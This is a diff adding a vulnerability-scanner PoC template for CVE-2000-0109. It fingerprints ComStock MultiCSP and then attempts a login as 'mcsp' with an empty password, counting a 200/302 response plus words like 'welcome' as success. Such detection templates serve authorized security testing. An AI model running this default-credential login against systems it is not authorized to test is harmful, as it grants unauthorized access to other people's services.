@@ -1,0 +1,66 @@
+[info]
+author = "ave"
+description = "Standard & Poor's ComStock 中的 mcsp 客户端站点处理系统（MultiCSP）在安装时默认创建了多个无密码或弱口令账户。本 PoC 尝试使用已知空口令/默认弱口令账户对目标服务进行认证，若登录成功则证明目标存在默认凭证漏洞，可据此获取未授权访问权限。仅用于授权安全测试。"
+id = "POC-AVE-2000-0308"
+name = "CVE-2000-0109 ComStock MultiCSP 默认弱口令登录检测 PoC"
+severity = "critical"
+tags = ["ave-2000-0308"]
+vuln_id = [
+    "CVE-2000-0109",
+    "AVE-2000-0308",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Standard",
+    "ComStock",
+    "MultiCSP",
+    "mcsp",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=mcsp&password="
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "welcome",
+    "logged",
+    "success",
+    "menu",
+    "session",
+]
